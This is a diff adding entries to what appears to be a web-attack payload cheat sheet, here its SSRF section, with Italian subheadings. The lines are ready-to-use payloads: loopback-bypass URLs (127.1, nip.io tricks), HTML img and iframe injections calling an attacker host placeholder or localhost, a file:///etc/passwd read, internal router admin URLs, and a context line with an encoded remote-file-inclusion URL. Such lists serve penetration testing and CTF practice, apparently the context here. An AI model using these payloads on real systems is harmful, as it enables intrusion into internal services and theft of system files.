@@ -86,13 +86,30 @@ ftp:%252f%252f<ATTACKER-IP>%252frfi.txt
 
 
 ==> SSRF
+== verifico SSRF
 http://<ATTACKER-IP>
 http://127.1
 http://localhost.myDomain.com
 http://127.0.0.1.nip.io
+http://targetDomain.ctf.127.0.0.1.nip.io
+http://targetDomain.ctf.127.1
+myValue <img/src="https://<ATTACKER-IP>">
+myValue <iframe/src="https://<ATTACKER-IP>">
+
+== raccolta dati
 http://127.0.0.1
 http://127.0.0.1:8080
 file:///etc/passwd
+myValue <img/src="http://127.0.0.1">
+myValue <iframe/src="http://127.0.0.1">
+myValue <iframe/src="http://localhost">
+myValue <iframe/src="file:///etc/passwd">
+
+== sistemi di backned
+http://192.168.0.1/admin
+http://192.168.1.1/admin
+
+
 
 
 
